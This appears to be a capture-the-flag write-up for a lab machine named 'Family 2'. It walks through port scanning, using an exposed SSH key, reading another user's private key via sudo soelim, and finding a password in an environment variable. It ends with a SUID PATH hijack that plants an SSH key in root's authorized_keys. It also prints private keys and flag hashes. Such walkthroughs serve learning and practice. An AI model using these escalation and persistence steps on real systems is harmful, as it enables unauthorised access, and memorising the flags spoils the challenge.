# Family 2

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.200:22
Open 10.0.2.200:25
Open 10.0.2.200:80
Open 10.0.2.200:139
Open 10.0.2.200:143
Open 10.0.2.200:445
Open 10.0.2.200:993
Open 10.0.2.200:995
Open 10.0.2.200:110
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.200
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8iGU6tf/bJeTz4LffU0v/j8xZ1L2dzVf0uRJddhZ8VYE5Vu0s+jw2bZUsQO04rPBZr2E8s2EHH8y92oIV83tT1Af4aCPY70U3RWun/lzWiXYRnpd3WLh/Zkqy1r/KXWm0cZdnfMFOpaOm15Drqrf9xhtPLFwRMjvBncSoWsDJ6iugZSYfvCieopC2DpcAoDg+JKnghcsLPpSchPcHdC99QJSq7FUeSLR6XknHAYqx08c/gGlsddcZV83+txxf6xkIxLZY0S+0uS+AZ8eeRhgrT/euWboWzOnNJKXTnKhg0t4q7gSM9jEIVltjxEAysM6ioy7ht5nj2bdDdGWpp1PpG8tlzqTOfuD+V92Tr2pyqfQFJJvOlseCWmUo9MPiDDyQthbWWQ2u8X+imHycBaZgJ0EMmren0mj6iDdG/q8sb2q1J/SgFiod+2nahTXDAQ7I9F3GbguIAAIInZuVsXDFUbr58Y5bb+4DmcTX8jiLzlk2iruVhlBp5EGrlzMOpF0=
|   256 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIlEQHCjgDvuOLB3N4GxSwqHR5HvE5SVWtLTzh50O4xBFnez4SCGcE9tlUSutAUADQb3hG8X31MBxORqH31UJ9c=
|   256 e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAu6QlOK+lvy3uZTE3EAS5lULanS7qx17oCiOaBOpDdX
25/tcp  open  smtp        syn-ack Postfix smtpd
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-31T13:31:43
| Not valid after:  2031-10-29T13:31:43
| MD5:   933b:a2d2:7545:a715:bf5c:31e4:1d47:d435
| SHA-1: 7da3:ad60:05d0:74b2:8420:cd78:1a96:e3a7:000a:12c3
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUFX9Q7O7cozePlphw/rQ8Y7cuNYswDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMTAzMTEzMzE0M1oXDTMxMTAyOTEz
| MzE0M1owETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAy7fr96U5hvLNYYqjgFMsBD7wsH3tlOkvF9dXWyzs1j1JbmdoV9Il
| fet5d1CQdtv75nEFWl7ue3ClrjH1q40HpkfCJfC52ENbufLadhD9gI/eWseynNvB
| e5GQvbPrhz+9/wJqkLRslaYtanpzdZms6fN1gCgZjEQz4lmQ1gs1DpnjevK2/1Wv
| /PN6y23jnODe+3Z+8ILBIEPGHeBbt/10tdZRQcNcCIk9yORxdW78YLE332BQIsiY
| ERpd1Ag6Daafc37SRm6bUSbhUwoGOZmxqdbFF78WjF3evvRBzzqX5Ta7+Y6GQ25o
| 4Rfdl2Sk9KXxWZWauwIixnEaxrtrp1i3MQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAYtfcQGkl1pWEGem9
| hEBmlWQ6BiFDpuChcli9NTjD5nRM9dduXfvq+CbSkwztf7UndYiFSGQu4P0//op+
| bP5kENZHPvvdvIL51UABwbZ97pF+hX35TvIh66jLOFFnOHRVg12Xc3LXA7Jyjuh6
| CNzBcy5nFY0hNplNOol/t53s+NH/ivyXdw/I0qaEUmOt/J7xQo+wGuvwI28yEvuw
| v1m7TdIpVUFjIS7o3y7Wmlzt2a5sKz2vOnnqNf5eCfWHti2rOK2qB3562AJemdn6
| f1eVXPE08znqeYQs3Xjtt9NJYj43HJkWIv5XiMJW0PPbIb9SOuy1D3Bw+Zg7SWJc
| 7Jc9VQ==
|_-----END CERTIFICATE-----
|_smtp-commands: debian.numericable.fr, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        syn-ack Apache httpd 2.4.51
|_http-server-header: Apache/2.4.51 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 11K   2021-10-31 16:25  nicegiftformybaby
|_
110/tcp open  pop3        syn-ack Dovecot pop3d
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-31T13:31:43
| Not valid after:  2031-10-29T13:31:43
| MD5:   933b:a2d2:7545:a715:bf5c:31e4:1d47:d435
| SHA-1: 7da3:ad60:05d0:74b2:8420:cd78:1a96:e3a7:000a:12c3
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUFX9Q7O7cozePlphw/rQ8Y7cuNYswDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMTAzMTEzMzE0M1oXDTMxMTAyOTEz
| MzE0M1owETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAy7fr96U5hvLNYYqjgFMsBD7wsH3tlOkvF9dXWyzs1j1JbmdoV9Il
| fet5d1CQdtv75nEFWl7ue3ClrjH1q40HpkfCJfC52ENbufLadhD9gI/eWseynNvB
| e5GQvbPrhz+9/wJqkLRslaYtanpzdZms6fN1gCgZjEQz4lmQ1gs1DpnjevK2/1Wv
| /PN6y23jnODe+3Z+8ILBIEPGHeBbt/10tdZRQcNcCIk9yORxdW78YLE332BQIsiY
| ERpd1Ag6Daafc37SRm6bUSbhUwoGOZmxqdbFF78WjF3evvRBzzqX5Ta7+Y6GQ25o
| 4Rfdl2Sk9KXxWZWauwIixnEaxrtrp1i3MQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAYtfcQGkl1pWEGem9
| hEBmlWQ6BiFDpuChcli9NTjD5nRM9dduXfvq+CbSkwztf7UndYiFSGQu4P0//op+
| bP5kENZHPvvdvIL51UABwbZ97pF+hX35TvIh66jLOFFnOHRVg12Xc3LXA7Jyjuh6
| CNzBcy5nFY0hNplNOol/t53s+NH/ivyXdw/I0qaEUmOt/J7xQo+wGuvwI28yEvuw
| v1m7TdIpVUFjIS7o3y7Wmlzt2a5sKz2vOnnqNf5eCfWHti2rOK2qB3562AJemdn6
| f1eVXPE08znqeYQs3Xjtt9NJYj43HJkWIv5XiMJW0PPbIb9SOuy1D3Bw+Zg7SWJc
| 7Jc9VQ==
|_-----END CERTIFICATE-----
|_pop3-capabilities: TOP PIPELINING STLS RESP-CODES USER AUTH-RESP-CODE CAPA SASL(PLAIN) UIDL
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn syn-ack Samba smbd 4
143/tcp open  imap        syn-ack Dovecot imapd
|_imap-capabilities: IMAP4rev1 more AUTH=PLAINA0001 ID OK IDLE post-login LOGIN-REFERRALS ENABLE capabilities have STARTTLS listed SASL-IR Pre-login LITERAL+
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-31T13:31:43
| Not valid after:  2031-10-29T13:31:43
| MD5:   933b:a2d2:7545:a715:bf5c:31e4:1d47:d435
| SHA-1: 7da3:ad60:05d0:74b2:8420:cd78:1a96:e3a7:000a:12c3
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUFX9Q7O7cozePlphw/rQ8Y7cuNYswDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMTAzMTEzMzE0M1oXDTMxMTAyOTEz
| MzE0M1owETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAy7fr96U5hvLNYYqjgFMsBD7wsH3tlOkvF9dXWyzs1j1JbmdoV9Il
| fet5d1CQdtv75nEFWl7ue3ClrjH1q40HpkfCJfC52ENbufLadhD9gI/eWseynNvB
| e5GQvbPrhz+9/wJqkLRslaYtanpzdZms6fN1gCgZjEQz4lmQ1gs1DpnjevK2/1Wv
| /PN6y23jnODe+3Z+8ILBIEPGHeBbt/10tdZRQcNcCIk9yORxdW78YLE332BQIsiY
| ERpd1Ag6Daafc37SRm6bUSbhUwoGOZmxqdbFF78WjF3evvRBzzqX5Ta7+Y6GQ25o
| 4Rfdl2Sk9KXxWZWauwIixnEaxrtrp1i3MQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAYtfcQGkl1pWEGem9
| hEBmlWQ6BiFDpuChcli9NTjD5nRM9dduXfvq+CbSkwztf7UndYiFSGQu4P0//op+
| bP5kENZHPvvdvIL51UABwbZ97pF+hX35TvIh66jLOFFnOHRVg12Xc3LXA7Jyjuh6
| CNzBcy5nFY0hNplNOol/t53s+NH/ivyXdw/I0qaEUmOt/J7xQo+wGuvwI28yEvuw
| v1m7TdIpVUFjIS7o3y7Wmlzt2a5sKz2vOnnqNf5eCfWHti2rOK2qB3562AJemdn6
| f1eVXPE08znqeYQs3Xjtt9NJYj43HJkWIv5XiMJW0PPbIb9SOuy1D3Bw+Zg7SWJc
| 7Jc9VQ==
|_-----END CERTIFICATE-----
445/tcp open  netbios-ssn syn-ack Samba smbd 4
993/tcp open  ssl/imap    syn-ack Dovecot imapd
|_imap-capabilities: IMAP4rev1 more AUTH=PLAINA0001 OK IDLE capabilities LOGIN-REFERRALS post-login ENABLE have ID listed SASL-IR Pre-login LITERAL+
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-31T13:31:43
| Not valid after:  2031-10-29T13:31:43
| MD5:   933b:a2d2:7545:a715:bf5c:31e4:1d47:d435
| SHA-1: 7da3:ad60:05d0:74b2:8420:cd78:1a96:e3a7:000a:12c3
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUFX9Q7O7cozePlphw/rQ8Y7cuNYswDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMTAzMTEzMzE0M1oXDTMxMTAyOTEz
| MzE0M1owETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAy7fr96U5hvLNYYqjgFMsBD7wsH3tlOkvF9dXWyzs1j1JbmdoV9Il
| fet5d1CQdtv75nEFWl7ue3ClrjH1q40HpkfCJfC52ENbufLadhD9gI/eWseynNvB
| e5GQvbPrhz+9/wJqkLRslaYtanpzdZms6fN1gCgZjEQz4lmQ1gs1DpnjevK2/1Wv
| /PN6y23jnODe+3Z+8ILBIEPGHeBbt/10tdZRQcNcCIk9yORxdW78YLE332BQIsiY
| ERpd1Ag6Daafc37SRm6bUSbhUwoGOZmxqdbFF78WjF3evvRBzzqX5Ta7+Y6GQ25o
| 4Rfdl2Sk9KXxWZWauwIixnEaxrtrp1i3MQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAYtfcQGkl1pWEGem9
| hEBmlWQ6BiFDpuChcli9NTjD5nRM9dduXfvq+CbSkwztf7UndYiFSGQu4P0//op+
| bP5kENZHPvvdvIL51UABwbZ97pF+hX35TvIh66jLOFFnOHRVg12Xc3LXA7Jyjuh6
| CNzBcy5nFY0hNplNOol/t53s+NH/ivyXdw/I0qaEUmOt/J7xQo+wGuvwI28yEvuw
| v1m7TdIpVUFjIS7o3y7Wmlzt2a5sKz2vOnnqNf5eCfWHti2rOK2qB3562AJemdn6
| f1eVXPE08znqeYQs3Xjtt9NJYj43HJkWIv5XiMJW0PPbIb9SOuy1D3Bw+Zg7SWJc
| 7Jc9VQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3    syn-ack Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING USER AUTH-RESP-CODE CAPA SASL(PLAIN) UIDL RESP-CODES
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-31T13:31:43
| Not valid after:  2031-10-29T13:31:43
| MD5:   933b:a2d2:7545:a715:bf5c:31e4:1d47:d435
| SHA-1: 7da3:ad60:05d0:74b2:8420:cd78:1a96:e3a7:000a:12c3
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUFX9Q7O7cozePlphw/rQ8Y7cuNYswDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMTAzMTEzMzE0M1oXDTMxMTAyOTEz
| MzE0M1owETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAy7fr96U5hvLNYYqjgFMsBD7wsH3tlOkvF9dXWyzs1j1JbmdoV9Il
| fet5d1CQdtv75nEFWl7ue3ClrjH1q40HpkfCJfC52ENbufLadhD9gI/eWseynNvB
| e5GQvbPrhz+9/wJqkLRslaYtanpzdZms6fN1gCgZjEQz4lmQ1gs1DpnjevK2/1Wv
| /PN6y23jnODe+3Z+8ILBIEPGHeBbt/10tdZRQcNcCIk9yORxdW78YLE332BQIsiY
| ERpd1Ag6Daafc37SRm6bUSbhUwoGOZmxqdbFF78WjF3evvRBzzqX5Ta7+Y6GQ25o
| 4Rfdl2Sk9KXxWZWauwIixnEaxrtrp1i3MQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAYtfcQGkl1pWEGem9
| hEBmlWQ6BiFDpuChcli9NTjD5nRM9dduXfvq+CbSkwztf7UndYiFSGQu4P0//op+
| bP5kENZHPvvdvIL51UABwbZ97pF+hX35TvIh66jLOFFnOHRVg12Xc3LXA7Jyjuh6
| CNzBcy5nFY0hNplNOol/t53s+NH/ivyXdw/I0qaEUmOt/J7xQo+wGuvwI28yEvuw
| v1m7TdIpVUFjIS7o3y7Wmlzt2a5sKz2vOnnqNf5eCfWHti2rOK2qB3562AJemdn6
| f1eVXPE08znqeYQs3Xjtt9NJYj43HJkWIv5XiMJW0PPbIb9SOuy1D3Bw+Zg7SWJc
| 7Jc9VQ==
|_-----END CERTIFICATE-----
Service Info: Hosts:  debian.numericable.fr, 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: FAMILY2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FAMILY2<00>          Flags: <unique><active>
|   FAMILY2<03>          Flags: <unique><active>
|   FAMILY2<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60402/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33447/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 63738/udp): CLEAN (Failed to receive data)
|   Check 4 (port 21498/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-02-12T15:44:13
|_  start_date: N/A
|_clock-skew: -6s
```
:::

## SSH

The webserver is hosting SSH key which can be used to login into machine
```bash
└─$ curl http://10.0.2.200/nicegiftformybaby -s | xxd -r > id_rsa.baby
└─$ chmod 600 id_rsa.baby
└─$ ssh -i id_rsa.baby baby@10.0.2.200
baby@family2:~$ id
uid=1002(baby) gid=1002(baby) groups=1002(baby)
```

## Privilege Escalation (mum)

```bash
baby@family2:~$ sudo -l
Matching Defaults entries for baby on family2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User baby may run the following commands on family2:
    (mum) NOPASSWD: /usr/bin/soelim
```

- [https://gtfobins.org/gtfobins/soelim/](https://gtfobins.org/gtfobins/soelim/)

```bash
baby@family2:~$ sudo -u mum soelim /home/mum/.ssh/id_rsa
.lf 1 /home/mum/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
JminG0qhVpq/4xAAAACm11bUBkZWJpYW4=
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ nano id_rsa.mum
└─$ chmod 600 id_rsa.mum
└─$ ssh -i id_rsa.mum mum@10.0.2.200
mum@family2:~$ id
uid=1001(mum) gid=1001(mum) groups=1001(mum)
```

## Privilege Escalation (dad)

```
mum@family2:~$ sudo -l
Matching Defaults entries for mum on family2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mum may run the following commands on family2:
    (root) NOPASSWD: /usr/bin/shred -f -z /etc/passwd
    (dad) ALL
```

`shref` command is most likely not useful for privilege escalation, but if we find `mum`'s password we can run commands as `dad`.

There are some emails
```bash
mum@family2:~$ cat /var/mail/mum
<snip>
--E05877FD86.1635767543/debian.numericable.fr
Content-Description: Undelivered Message
Content-Type: message/rfc822
Content-Transfer-Encoding: 8bit

Return-Path: <mum@debian.numericable.fr>
Received: by debian.numericable.fr (Postfix, from userid 1001)
	id E05877FD86; Mon,  1 Nov 2021 12:52:23 +0100 (CET)
To: root@debian.numericable.fr
From: mum@debian.numericable.fr
Auto-Submitted: auto-generated
Subject: *** SECURITY information for debian ***
Message-Id: <20211101115223.E05877FD86@debian.numericable.fr>
Date: Mon,  1 Nov 2021 12:52:23 +0100 (CET)

debian : Nov  1 11:52:23 : mum : a password is required ; TTY=pts/1 ; PWD=/home/mum ; USER=dad ; COMMAND=/bin/bash

--E05877FD86.1635767543/debian.numericable.fr--
```

```bash
mum@family2:~$ grep COMMAND /var/mail/mum
debian : Oct 31 15:34:43 : mum : a password is required ; TTY=pts/1 ; PWD=/home/mum/.ssh ; USER=root ; COMMAND=list
debian : Oct 31 15:51:35 : mum : a password is required ; TTY=pts/1 ; PWD=/home/mum ; USER=root ; COMMAND=/home/mum/test
debian : Oct 31 15:59:03 : mum : a password is required ; TTY=pts/1 ; PWD=/home/mum ; USER=root ; COMMAND=list
debian : Oct 31 17:28:49 : mum : a password is required ; TTY=pts/1 ; PWD=/home/mum ; USER=root ; COMMAND=list
debian : Nov  1 11:52:11 : mum : a password is required ; TTY=pts/1 ; PWD=/home/mum ; USER=dad ; COMMAND=/usr/bin/bash
debian : Nov  1 11:52:23 : mum : a password is required ; TTY=pts/1 ; PWD=/home/mum ; USER=dad ; COMMAND=/bin/bash
```

Environment variable contains password
```bash
mum@family2:/etc$ printenv | grep pass -i
passwd=LA0172
```

::: tip Creds
`mum:LA0172`
:::

```bash
mum@family2:/etc$ sudo -u dad bash
dad@family2:/etc$ id
uid=1000(dad) gid=1000(dad) groups=1000(dad)
```

### User.txt

```bash
dad@family2:~$ cat user.txt
802809d489f8684f00fd6b8970724283
```

## Privilege Escalation (root)

Mail for dad has nothing, but he does receive it periodically.

There's email for non-existing user
```bash
dad@family2:~$ cat /var/mail/eekrom
From sabine@debian.numericable.fr  Sun Oct 31 15:30:17 2021
Return-Path: <sabine@debian.numericable.fr>
X-Original-To: eekrom
Delivered-To: eekrom@debian.numericable.fr
Received: from smtp (unknown [192.168.0.24])
	by debian.numericable.fr (Postfix) with ESMTP id 3E7737FDC7
	for <eekrom>; Sun, 31 Oct 2021 15:29:58 +0100 (CET)

TEST MAN TEST PROUT

dad@family2:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
dad:x:1000:1000:,,,:/home/dad:/bin/bash
mum:x:1001:1001:,,,:/home/mum:/bin/bash
baby:x:1002:1002:,,,:/home/baby:/bin/bash
```

New SUID unlocked
```bash
dad@family2:~$ find / -perm -4000 -ls 2>/dev/null
...
57     16 -rwsr-sr-x   1 root     root          16096 Oct 31  2021 /opt/clock
```

Looks like it's running `date` command
```bash
dad@family2:~$ file /opt/clock
/opt/clock: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c2d23ea9475938a9dd429b6390c97b750d6a1d84, for GNU/Linux 3.2.0, not stripped

dad@family2:~$ /opt/clock
Thu 12 Feb 2026 05:29:00 PM CET

dad@family2:~$ strings /opt/clock
/lib64/ld-linux-x86-64.so.2
setresuid
system
...
date
...
```

```bash
└─$ gen_ssh_deploy id_rsa root
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /root/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPG9onu2mDFgy4qwBU4OFZFhpokTcC1jeYgBdjazH+Uc woyag@kraken' >> /root/.ssh/authorized_keys ; chmod 700 /root/.ssh ; chmod 600 /root/.ssh/authorized_keys
```

```bash
dad@family2:~$ echo "SSH_DEPLOY_CMD" > /tmp/date
dad@family2:~$ chmod +x /tmp/date
dad@family2:~$ PATH="/tmp:$PATH" /opt/clock
```

```bash
└─$ ssh -i id_rsa root@10.0.2.200
root@family2:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@family2:~# cat root.txt
7177e6f98837966e1ce5d93c59ba0453
```